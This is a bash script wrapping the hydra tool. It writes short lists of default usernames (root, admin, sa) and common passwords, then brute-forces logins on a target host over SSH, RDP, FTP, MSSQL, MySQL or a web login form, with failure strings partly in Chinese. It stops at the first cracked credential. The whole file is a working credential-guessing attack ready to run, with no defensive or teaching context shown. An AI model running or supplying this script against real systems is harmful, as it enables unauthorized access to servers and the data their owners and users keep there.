#!/usr/bin/env bash
HOST="${1:?usage: bash hydra.sh HOST [ssh|rdp|ftp|mssql|mysql|http]}"
PROTO="${2:-ssh}"
USERS="runs/users.txt"; PASS="runs/pass.txt"
printf 'root\nadmin\nadministrator\nsa\ntest\n' > "$USERS"
printf 'root\n123456\nadmin\npassword\nP@ssw0rd\nadmin123\n' > "$PASS"
case "$PROTO" in
  ssh)   hydra -L "$USERS" -P "$PASS" -t 2 -W 3 -f "ssh://$HOST" ;;
  rdp)   hydra -l administrator -P "$PASS" -t 2 -W 5 -f "rdp://$HOST" ;;
  ftp)   hydra -L "$USERS" -P "$PASS" -t 2 -W 3 -f "ftp://$HOST" ;;
  mssql) hydra -l sa -P "$PASS" -t 2 -W 5 -f "mssql://$HOST" ;;
  mysql) hydra -l root -P "$PASS" -t 2 -W 5 -f "mysql://$HOST" ;;
  http)  hydra -l admin -P "$PASS" -t 2 -W 5 -f "$HOST" http-post-form \
           '/login:username=^USER^&password=^PASS^:F=密码错误|Invalid|登录失败' ;;
  *) echo "unknown proto: $PROTO"; exit 2 ;;
esac
# 判定：输出里的 [端口][协议] ... login: X password: Y 就是命中；命中后立刻停（-f 已带）
